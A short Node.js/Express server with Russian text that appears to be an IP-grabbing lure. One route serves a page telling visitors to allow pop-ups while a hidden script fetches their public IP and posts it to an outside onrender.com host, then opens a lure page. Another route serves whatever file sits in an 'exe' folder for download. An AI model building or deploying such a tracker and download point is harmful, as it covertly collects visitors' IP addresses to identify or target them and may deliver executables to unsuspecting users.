const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 8080;
const frontend = fs.readFileSync('mainpage.html', 'utf8');
const redirect = fs.readFileSync('redirect.html', 'utf8');

function getFirstFileSync(dirPath) {
  const entries = fs.readdirSync(dirPath, { withFileTypes: true });
  const firstFile = entries.find(entry => entry.isFile());
  
  return firstFile ? path.join(dirPath, firstFile.name) : null;
}

const fileFullPath = getFirstFileSync('./exe');
console.log(fileFullPath);

app.get('/posts/84146', async (req, res) => {
  res.send(frontend);
});

app.post('/postapi', async (req, res) => {
  console.log(req.body);
  res.json({answer: "ok"});
});

app.get('/shrt/84', async (req, res) => {
  res.send(`
<b>Подождите....<br>Разрешите всплывающие окна, если они заблокированы</b>

<script>
//я апасный хакир каторый вычислит типя па айпи
async function ipGet() {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log(data.ip);
    fetch('https://razoblaheniya.onrender.com/postapi', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ip: data.ip})
    })
}
ipGet();
window.open('https://razoblaheniya.onrender.com/posts/84146', '_blank', 'width=1280,height=720');
</script>

`);
});

app.get('/download/7251', async (req, res) => {
  res.download(fileFullPath);
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на порту ${PORT}`);
});